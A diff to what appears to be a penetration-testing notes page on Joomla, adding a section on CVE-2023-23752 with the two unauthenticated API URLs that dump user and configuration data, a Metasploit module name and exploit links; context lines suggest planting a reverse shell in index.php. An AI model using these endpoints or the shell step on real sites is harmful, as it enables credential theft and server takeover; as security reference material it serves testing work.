@@ -44,4 +44,13 @@ If you managed to get **admin credentials** you can **RCE inside of it** by addi
 
 - Modify the `index.php` adding there your reverse shell
 
+## Information disclosure
+
+Versions From 4.0.0 to 4.2.7 are vulnerable to Unauthenticated information disclosure (CVE-2023-23752) that will dump creds and other information.
+
+- Users: `http://<host>/api/v1/users?public=true`
+- Config File: `http://<host>/api/index.php/v1/config/application?public=true`
+
+**MSF Module**: `scanner/http/joomla_api_improper_access_checks` or ruby script: [51334](https://www.exploit-db.com/exploits/51334)
+- [Github exploit & instructions](https://github.com/Acceis/exploit-CVE-2023-23752)
 
